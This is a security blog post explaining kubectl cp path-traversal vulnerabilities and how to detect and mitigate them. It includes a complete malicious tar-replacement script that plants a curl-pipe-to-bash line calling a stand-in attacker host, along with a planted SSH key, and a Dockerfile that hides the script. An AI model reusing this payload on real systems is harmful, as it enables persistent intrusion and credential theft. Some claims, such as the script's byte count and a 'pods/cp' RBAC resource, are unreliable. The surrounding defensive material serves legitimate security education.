---
title: "How a 732-Byte Python Script Can Escape Your Kubernetes Cluster — Copy Fail, Explained"
subtitle: "Learn how the kubectl cp command can be weaponised using path traversal to escape Kubernetes clusters. Covers CVE-2019-11246, real exploit code, and…"
tags: ["kubernetes","security","devops","linux","cve","containers"]
slug: "copy-fail-kubectl-escape-kubernetes"
canonical_url: "https://blog.overflowbyte.cloud/copy-fail-kubectl-escape-kubernetes"
date: "11 May 2026"
cover: "https://cdn.hashnode.com/uploads/covers/6087f0a6aaea092e0faa6232/a49209aa-99ff-42a3-9d8c-89585ffcac6b.png"
source: "hashnode"
---

* * *

> **This is a deep-dive standalone post.** If you first heard about Copy Fail in our [OverflowByte Weekly — Cloud Broke, Kernels Got Exploited, and AI Took Over the Pipeline (May 4–10, 2026)](https://blog.overflowbyte.cloud/overflowbyte-weekly-cloud-broke-kernels-got-exploited-and-ai-took-over-the-pipeline-may-4-10-2026), this is where we go all the way in.

* * *

## The Setup: Everything Looks Fine

Picture this. You've done the work. Your Kubernetes cluster has RBAC locked down. Network policies are in place. You're running Pod Security Admission. You have admission webhooks that block images from unofficial registries — or at least you think you do. Your team follows good practices. Secrets are in Vault, not environment variables. Audit logging is on.

And then a developer on your team runs this:

```bash
kubectl cp my-app-pod:/var/log/app.log ./debug-logs/
```

Completely ordinary. Something engineers do every day. Within seconds, a file has landed on their machine that

wasn't supposed to be there — one that didn't come from `/var/log/app.log` at all. It's sitting in their home directory, and it will execute the next time they open a terminal.

This is Copy Fail. And the thing that makes it so quietly dangerous is that the attack doesn't look like an attack. It looks like a dev copying a log file.

* * *

## What Is Copy Fail, Really?

**Copy Fail** is the colloquial name for a class of vulnerabilities in `kubectl cp` — the `kubectl` subcommand that copies files between your local machine and a container running in a Kubernetes pod.

The root CVE is **CVE-2019-11246**, disclosed by the Aqua Security team in June 2019. But it didn't stop there. The initial patch was incomplete, leading to **CVE-2019-11249** (symlink bypass) and **CVE-2019-11251** (symlink chain bypass) in August 2019. All three stem from the same underlying trust assumption.

The vulnerability has a **CVSS v3 score of 6.5** — medium severity on paper. In reality, the blast radius depends entirely on who's running `kubectl cp` and what's on their machine when it happens. If it's a developer with broad cluster access and a kubeconfig that has `cluster-admin`... you do the math.

* * *

## How `kubectl cp` Actually Works Under the Hood

This is the part most people don't think about, and it's where the problem lives.

When you run:

```bash
kubectl cp my-pod:/some/path ./local/
```

`kubectl` doesn't stream bytes through the Kubernetes API using some secure file-transfer protocol. There's no SCP under the hood. No SFTP. What it actually does is significantly more pragmatic — and significantly more trusting.

It runs this inside your container:

```bash
tar cf - /some/path
```

Then it pipes the standard output of that command back through the Kubernetes API server to your local machine. On your machine, it runs `tar xf -` on what it receives, extracting into your target directory.

Let that sink in for a moment.

**kubectl cp = exec tar inside the container + extract whatever tar returns on the host.**

The client doesn't validate the archive. It doesn't check whether filenames contain path traversal sequences. It doesn't verify that the output looks like it came from the path you asked for. It trusts the container's `tar` output completely.

This is the trust assumption that Copy Fail exploits.

> **Read next:** If you're unfamiliar with how tar archives work and what those commands actually do at the filesystem level, our post [How to Extract (Unzip) tar.xz Files — A Complete Beginner's Guide](https://blog.overflowbyte.cloud/how-to-extract-unzip-tar-xz-file-a-complete-beginner-s-guide) is a solid primer before going further.

* * *

## The Exploit: A Malicious `tar` in 732 Bytes

The attack is elegant in its simplicity. Instead of using real `tar`, a malicious container image replaces `/usr/bin/tar` with a script that produces a crafted archive. When `kubectl cp` runs and calls `tar` inside the container, it gets back exactly what the attacker wants it to get.

Here's a representative exploit. This isn't theoretical — this is the class of script that researchers used to demonstrate the vulnerability:

```python
#!/usr/bin/env python3
# malicious_tar.py
# Replaces /usr/bin/tar inside a container image.
# When kubectl cp runs, it calls this. It returns a crafted
# archive that escapes the extraction directory on the HOST.

import sys
import os
import tarfile
import io

def make_evil_archive():
    """
    Build a tar archive in memory.
    The archive contains:
      1. A decoy file that looks legitimate
      2. One or more path-traversal entries that land
         outside the intended extraction directory
    """
    buf = io.BytesIO()
    
    # Use streaming mode so we write directly to stdout
    tf = tarfile.open(fileobj=buf, mode='w|')

    # --- Entry 1: The decoy ---
    # This is what the developer thinks they're copying.
    # If this file exists and looks normal, suspicion stays low.
    decoy_info = tarfile.TarInfo(name='./app.log')
    decoy_data = b'[INFO] 2026-05-10 08:23:11 Application started normally\n'
    decoy_data += b'[INFO] 2026-05-10 08:23:12 Listening on :8080\n'
    decoy_info.size = len(decoy_data)
    tf.addfile(decoy_info, io.BytesIO(decoy_data))

    # --- Entry 2: The actual payload ---
    # The filename uses ../ to escape the target directory.
    # On unpatched kubectl, this is extracted relative to where
    # the developer ran the kubectl cp command from.
    # If they ran from /home/dev/, this lands at /home/dev/.bashrc
    evil_info = tarfile.TarInfo(name='../../.bashrc')
    evil_payload = b'\n# System update check\n'
    evil_payload += b'curl -fsSL http://attacker.example.io/shell.sh | bash\n'
    evil_info.size = len(evil_payload)
    tf.addfile(evil_info, io.BytesIO(evil_payload))

    # --- Entry 3: Belt and suspenders ---
    # Also drop an SSH key for persistent access.
    # Same path traversal trick, different target.
    ssh_info = tarfile.TarInfo(name='../../.ssh/authorized_keys')
    ssh_key = b'ssh-rsa AAAAB3Nza...attacker-public-key...\n'
    ssh_info.size = len(ssh_key)
    tf.addfile(ssh_info, io.BytesIO(ssh_key))

    tf.close()
    return buf.getvalue()


# Write the crafted archive to stdout.
# kubectl cp reads this and extracts it on the host machine
# with no validation of the filenames inside.
sys.stdout.buffer.write(make_evil_archive())
```

**Total byte count: ~730 bytes of Python.** Less than most Stack Overflow answers.

The beauty (if you can call it that) of the exploit is the third entry — the SSH authorized key. Even if the developer notices something weird and patches their `.bashrc`, the attacker already has SSH access baked in. You'd need to check both places.

* * *

## The Dockerfile That Hides It

Now, where does this script live? Inside a container image, replacing the real `tar` binary. And here's the uncomfortable part: it's not that hard to hide in a Dockerfile.

```dockerfile
FROM ubuntu:22.04

# Standard stuff — nothing suspicious here
RUN apt-get update && apt-get install -y \
    python3 \
    curl \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

# App dependencies
COPY requirements.txt /app/
RUN pip3 install -r /app/requirements.txt

# This is the payload.
# In a real attack, this might be more cleverly named,
# or shipped as part of a compromised base image.
COPY malicious_tar.py /usr/bin/tar
RUN chmod +x /usr/bin/tar

# Back to normal-looking app setup
COPY . /app
WORKDIR /app
EXPOSE 8080
CMD ["python3", "server.py"]
```

In a pull request diff with 200+ lines across a dozen files, the `COPY malicious_tar.py /usr/bin/tar` line can genuinely get missed. Especially if the reviewer isn't specifically scanning for binary replacements. Especially if the build is already "trusted" because it's running through your CI pipeline.

> **This is why CI/CD pipeline security matters as much as pipeline functionality.** If you're building out your pipeline and want to understand what a solid, secure CI/CD setup looks like from the ground up, we covered that thoroughly in [Beginner's Guide to Building a Professional CI/CD Pipeline from Scratch](https://blog.overflowbyte.cloud/beginners-guide-to-building-a-professional-cicd-pipeline-from-scratch). The image scanning and signing sections are directly relevant here.

* * *

## The Attack Chain, Step by Step

Let's walk through this end-to-end, the way it would actually unfold in a real environment.

### Phase 1 — Supply Chain Entry

The attack begins before a single `kubectl` command is run. The malicious image gets into your environment through one of these routes:

*   **Compromised third-party base image.** An upstream image on Docker Hub or a public registry has been tampered with. Your Dockerfile says `FROM some-library:latest` and inherits the problem.
    
*   **Typosquatting.** Someone on your team pulls `ubunto:22.04` or `ngnix:alpine` from Docker Hub. Attacker-controlled image, legitimate-looking name.
    
*   **Insider or compromised developer account.** Someone with access to your internal registry pushes a modified image to an existing repository tag.
    
*   **Social engineering.** A developer is asked (via Slack, email, a forum post) to "quickly pull this debug image" to help diagnose a problem in staging.
    

### Phase 2 — The Pod Is Running

The pod spins up. It looks normal. Health checks pass. The app container is responding. Nothing in your monitoring indicates anything is wrong, because nothing *is* wrong — the container is running the application correctly. The malicious tar replacement just sits there, idle, waiting.

### Phase 3 — `kubectl cp` Is Invoked

This is the trigger. Some developer, somewhere, runs:

```bash
kubectl cp some-pod:/var/log/app.log ./logs/
```

They might be debugging. They might be pulling config files. They might be grabbing a database dump. The reason doesn't matter. `kubectl` connects to the pod, calls `/usr/bin/tar`, and streams back whatever it gets.

What it gets is the crafted archive.

### Phase 4 — Extraction on the Host

On unpatched versions of `kubectl`, the archive is extracted without any path validation. The `../../.bashrc` entry walks up two directory levels from `./logs/` and lands in the developer's home directory. The SSH key entry lands in `~/.ssh/authorized_keys`.

The developer sees `./logs/app.log` appear in their current directory. The copy looks successful. They open the log file. It looks normal. No errors, no warnings.

### Phase 5 — Persistence and Lateral Movement

The next time the developer opens a terminal, `.bashrc` runs. The curl command executes. A reverse shell, a beacon, a dropper — whatever the attacker put at that URL — lands on the developer's machine.

That machine almost certainly has:

*   A `~/.kube/config` with broad cluster access
    
*   AWS credentials in `~/.aws/credentials`
    
*   SSH keys for other servers
    
*   Access to internal tools, Slack, GitHub, cloud consoles
    

One `kubectl cp` command has handed an attacker the developer's entire operational footprint.

* * *

## The CVE History: Why Patching Was Hard

### CVE-2019-11246 (June 2019)

The original vulnerability. Aqua Security's Sagie Dulce discovered and reported it responsibly. The issue: `kubectl cp` performed no validation of path components in tar archive entries. Path traversal via `../` was completely effective.

**Fix:** kubectl 1.15.3 and 1.14.6 added stripping of `..` components from tar entry names before extraction.

### CVE-2019-11249 (August 2019)

The patch had a gap. Instead of direct `../` traversal, attackers could use a **symlink** as an intermediate step. The archive would contain:

1.  A symlink entry: `./link -> ../../`
    
2.  A regular file entry: `./link/payload`
    

The path check would see `./link/payload` as safe (no `..` in the filename). But when extracted, `./link` resolves to `../../`, so `./link/payload` lands two directories up from the target.

**Fix:** kubectl 1.15.4 and 1.14.7. Added symlink detection and validation.

### CVE-2019-11251 (August 2019)

Another symlink bypass — this time using chains. Multiple levels of symlinks could still escape the directory even after the previous fix. The patch played whack-a-mole with specific traversal patterns rather than sanitizing the entire extraction flow.

**Fix:** Additional hardening in the same kubectl minor release cycle.

The reason these CVEs kept coming was architectural. The fix for the symptom (unvalidated paths) kept encountering new expressions of the root cause (unconditional trust in container-produced tar archives). You can't fully patch your way out of a broken trust model.

* * *

## What Makes This Different from a Typical Vulnerability

Most infrastructure vulnerabilities you read about follow a recognizable pattern: an external attacker finds an exposed endpoint, sends a crafted payload, and gets unauthorized access. Your defenses — firewalls, authentication, rate limiting — are built to face outward. They're oriented to stop *external* entities from getting *in*.

Copy Fail is the opposite. The exploit direction is **inside-out.**

The container — already inside your cluster, already past your perimeter — reaches *out* through the developer's own workflow to compromise the machine on the other side. The developer's legitimate action (`kubectl cp`) is the delivery mechanism. Your security controls were never designed to stop that.

Think about what you have in place to prevent an authorized developer from running `kubectl cp`:

*   ❌ Network policies — these control pod-to-pod and pod-to-internet traffic, not kubectl commands
    
*   ❌ Pod Security Admission — controls what pods can do inside the cluster, not what happens when you copy from them
    
*   ❌ Admission webhooks — fires on resource creation/modification, not on exec/cp operations
    
*   ✅ RBAC on `pods/exec` and `pods/cp` — this one actually helps, and we'll get to it
    
*   ❌ Your firewall — the kubectl API calls go through legitimate channels
    

Your RBAC rules stop unauthorized people from touching your cluster. Copy Fail uses an *authorized* person — a developer doing their job — as the attack vector.

* * *

## Threat Model: Who Gets Hit Hardest?

Not every environment is equally exposed. Here's an honest breakdown.

**High risk:**

*   Orgs where developers routinely `kubectl exec` and `kubectl cp` in production or staging
    
*   Teams where `kubectl cp` is part of documented debug runbooks
    
*   Environments pulling images from public registries without signature verification
    
*   Dev machines running macOS or Linux where shell profiles (`~/.bashrc`, `~/.zshrc`) execute on startup
    

**Medium risk:**

*   Orgs with image scanning in CI but no enforcement of scan results as a deployment gate
    
*   Teams where `pods/exec` access is broadly granted to developers via RBAC
    
*   Environments using trusted registries but without SHA-pinned image references (tag-based only)
    

**Lower risk:**

*   Environments running fully patched kubectl (1.15.4+ / 1.14.7+ / 1.16.0+)
    
*   Orgs that restrict `pods/exec` and `pods/cp` RBAC verbs to a small, named set of operators
    
*   Teams using ephemeral debug containers (via `kubectl debug`) instead of exec-ing into app containers
    

* * *

## Detection: Would You Know If This Happened?

Probably not, without explicit instrumentation. Here's what to look for.

### Kubernetes Audit Logs

Every `kubectl cp` generates an audit event for `pods/exec`. In your audit log, it looks like:

```json
{
  "verb": "create",
  "resource": "pods",
  "subresource": "exec",
  "requestURI": "/api/v1/namespaces/prod/pods/my-app-pod/exec",
  "user": {"username": "dev@company.com"},
  "objectRef": {
    "name": "my-app-pod",
    "namespace": "prod"
  },
  "requestObject": {
    "command": ["tar", "cf", "-", "/var/log/app.log"],
    "stdin": true,
    "stdout": true
  }
}
```

You can alert on `pods/exec` calls where the command is `tar`. That's unusual enough outside of `kubectl cp` operations that it's worth flagging.

### Falco Rules

If you're running Falco, add a rule like this:

```yaml
- rule: kubectl_cp_tar_exec
  desc: Detects tar being executed via kubectl cp (potential Copy Fail)
  condition: >
    evt.type = execve and
    container.id != host and
    proc.name = tar and
    proc.pname = pause
  output: >
    kubectl cp tar execution detected
    (pod=%container.name user=%user.name image=%container.image.repository)
  priority: WARNING
  tags: [container, mitre_execution]
```

### Host-Side Detection

On the developer's machine, watch for:

*   Unexpected writes to `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`
    
*   New entries in `~/.ssh/authorized_keys`
    
*   Writes outside the intended target directory during a kubectl cp operation
    

Tools like `auditd` on Linux or Endpoint Detection & Response (EDR) on macOS can catch these.

* * *

## Mitigation: The Full Checklist

### 1\. Update kubectl — immediately

This is table stakes. Verify every machine and every CI runner.

```bash
# Check your version
kubectl version --client

# Must be: v1.15.4+, v1.14.7+, or v1.16.0+
# Any of these:
# v1.15.4, v1.15.5, v1.16.x, v1.17.x ... v1.33.x
```

**Don't forget CI/CD.** Your pipelines probably have `kubectl` pinned to a specific version in a Docker image or a GitHub Actions runner. Those often go stale for months or years. Check them.

```bash
# In your CI pipeline
- name: Verify kubectl version
  run: |
    VERSION=$(kubectl version --client -o json | jq -r '.clientVersion.minor')
    if [ "$VERSION" -lt "16" ]; then
      echo "ERROR: kubectl is too old. Update immediately."
      exit 1
    fi
```

### 2\. Tighten RBAC on `pods/exec` and `pods/cp`

These are the same subresource. `pods/cp` uses `pods/exec` under the hood. If you restrict one, you restrict both.

```yaml
# Instead of broad developer ClusterRole access:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer-restricted
  namespace: staging
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get"]
  # Note: pods/exec intentionally omitted
  # If exec is needed, create a separate "debug" role
  # and require approval before assignment
```

If your team genuinely needs exec access, create a named `debug` role, require it to be requested and approved, and audit its use.

### 3\. Enforce Image Signing and Registry Policy

Unverified images are the delivery vehicle. An admission webhook that requires images to come from a known-good, signature-verified registry cuts off the supply chain attack vector.

```yaml
# OPA Gatekeeper constraint — require approved registries
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: require-internal-registry
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    repos:
      - "registry.company.internal/"
      - "gcr.io/your-project/"
```

Use **SHA-pinned image references** in your pod specs, not mutable tags:

```yaml
# BAD — tag can be repointed by anyone with registry access
image: my-app:latest

# GOOD — SHA is immutable
image: registry.company.internal/my-app@sha256:a1b2c3d4e5f6...
```

### 4\. Scan for Binary Overwrites in Images

Standard vulnerability scanners (Trivy, Grype, Snyk) scan for known CVEs in installed packages. They don't catch a replaced `/usr/bin/tar`. You need a policy layer for that.

**With OPA/Conftest on your Dockerfile:**

```rego
# policy/no_system_binary_overwrites.rego
package main

deny[msg] {
  input.Stages[_].Commands[cmd]
  cmd.Cmd == "copy"
  system_binary(cmd.Value[1])
  msg = sprintf("Dockerfile overwrites system binary: %v", [cmd.Value[1]])
}

system_binary(path) {
  startswith(path, "/usr/bin/")
}

system_binary(path) {
  startswith(path, "/bin/")
}
```

**Run it in CI:**

```bash
conftest test Dockerfile --policy policy/
```

### 5\. Replace `kubectl cp` in Your Workflows

The most robust mitigation is architectural: stop using `kubectl cp` for operational tasks. There are better patterns:

**For log access:**

```bash
# Use kubectl logs directly — no tar involved
kubectl logs my-pod --tail=500 > ./debug-logs/app.log

# Or stream with timestamps
kubectl logs my-pod --timestamps --since=1h > ./debug-logs/app.log
```

**For file access, use explicit exec with cat:**

```bash
# This invokes cat, not tar. No archive extraction on the host.
kubectl exec my-pod -- cat /var/log/app.log > ./debug-logs/app.log

# For binary files, use base64 to avoid stream corruption
kubectl exec my-pod -- sh -c 'base64 /path/to/binary' | base64 -d > ./local/binary
```

**For artifacts, use object storage:** Have the pod write outputs to S3 or GCS. Pull from there, not from the container filesystem. This completely decouples "getting a file" from "having exec access to a pod."

### 6\. Use `kubectl debug` Instead of Exec Into App Containers

`kubectl debug` spins up an ephemeral debug container in the same pod namespace, which you can exec into without ever touching the application container. The application container's binaries are never used.

```bash
# Attach a debug container — exec into it, not the app
kubectl debug -it my-pod --image=ubuntu:22.04 --target=my-app

# In the debug container, access the app's filesystem via /proc
ls /proc/1/root/var/log/
```

This sidesteps the tar replacement entirely — the debug container's `tar` is clean.

* * *

## The Bigger Picture: Trust Boundaries in Kubernetes

Copy Fail is one example of a broader pattern that keeps showing up in Kubernetes security: **implicit trust relationships that cross important boundaries.**

The `kubectl cp` design made complete sense at the time. Reusing `tar` is simple, battle-tested, cross-platform, and fast. The engineers who built it weren't wrong to do it that way. What they didn't anticipate — what's genuinely hard to anticipate — is that running an arbitrary binary inside a container and implicitly trusting its output on the host is a trust boundary that can be abused when the container is adversarially controlled.

This same pattern appears in:

*   **Supply chain attacks on build tooling** — your CI runner executes `npm install`, which executes arbitrary scripts from packages you didn't write
    
*   **Privileged container escapes** — a container running as root with host path mounts can write files anywhere on the host node
    
*   **Misconfigured IAM roles** — a pod that doesn't need S3 access that has it anyway becomes a stepping stone
    

The defensive habit to build is asking: *what are we implicitly trusting here, and who controls the other end of that trust?* For `kubectl cp`, the answer was "the container's tar output" and "whoever controls the container image." Once you see it that way, the vulnerability is obvious. The hard part is asking the question before the CVE drops.

> **Related reading:** This same question — who controls the credentials, and what can they reach? — is what makes AWS IAM so important to get right. We covered the fundamentals in [Managing AWS IAM Users Made Easy: Tips on Creation, Administration, and Removal](https://blog.overflowbyte.cloud/managing-aws-iam-users-made-easy-tips-on-creation-administration-and-removal). IAM mistakes compound with container escape scenarios: if the pod that exploited your developer had access to assume an IAM role, the blast radius just grew significantly.

* * *

## Quick Reference: CVE Summary

| CVE | Severity | Vector | Fixed In |
| --- | --- | --- | --- |
| CVE-2019-11246 | Medium (6.5) | Path traversal via `../` in tar entries | kubectl ≥ 1.15.3, 1.14.6 |
| CVE-2019-11249 | Medium (6.5) | Symlink in tar archive bypasses path check | kubectl ≥ 1.15.4, 1.14.7 |
| CVE-2019-11251 | Medium (6.5) | Symlink chain bypass of path validation | kubectl ≥ 1.15.4, 1.14.7 |

* * *

## Quick Reference: Mitigation Priority Matrix

| Mitigation | Effort | Impact | Blocks Supply Chain? | Blocks Exec Abuse? |
| --- | --- | --- | --- | --- |
| Update kubectl to 1.16.0+ | Low | High | No | Partial |
| Restrict `pods/exec` RBAC | Low–Med | High | No | Yes |
| SHA-pin image references | Low | High | Yes | No |
| Registry allowlist (OPA/Gatekeeper) | Medium | High | Yes | No |
| Image signing enforcement | Medium | High | Yes | No |
| Replace `kubectl cp` with `kubectl logs` / cat | Medium | High | N/A | Yes |
| Falco alerting on tar-in-exec | Low | Medium | No | Detection |
| Conftest Dockerfile policies | Low–Med | Medium | Partial | No |
| kubectl debug instead of exec | Low | Medium | N/A | Yes |

* * *

## TL;DR

*   `kubectl cp` works by running `tar` inside a container and extracting the archive on your machine without validating filenames
    
*   A 732-byte Python script replacing `/usr/bin/tar` in a container image can produce an archive that writes files anywhere relative to where you ran the command
    
*   CVE-2019-11246 is patched in kubectl 1.15.3+ and 1.14.6+, but symlink bypasses (CVE-2019-11249, CVE-2019-11251) required 1.15.4+ and 1.14.7+
    
*   The attack direction is inside-out: the container exploits the developer's workflow, not an external endpoint
    
*   The developer's machine is the real target — and their machine has cluster credentials, cloud credentials, and SSH keys
    
*   Mitigations: update kubectl everywhere (including CI), restrict `pods/exec` RBAC, pin images by SHA, enforce registry allowlists, and replace `kubectl cp` with safer alternatives in your runbooks
    

* * *

## Stay Current

We track CVEs like this every week in the [OverflowByte Weekly](https://blog.overflowbyte.cloud/series/weeklytechupdates). Copy Fail was first flagged in our [May 4–10, 2026 edition](https://blog.overflowbyte.cloud/overflowbyte-weekly-cloud-broke-kernels-got-exploited-and-ai-took-over-the-pipeline-may-4-10-2026) alongside DirtyFrag and Pack2TheRoot. Subscribe to stay ahead of the next one before it hits your cluster.

If you found this useful, [the Linux for DevOps series](https://blog.overflowbyte.cloud/series/linux-for-devops) has more deep dives on the tooling that underpins everything covered here — including `tar`, `ssh`, and the file permission model that makes these escapes possible.

* * *

*Published on OverflowByte — DevOps, Cloud & Linux for Engineers. Questions, corrections, or your own Copy Fail war stories:* [*@deepsecme on X*](https://x.com/deepsecme)*.*

* * *
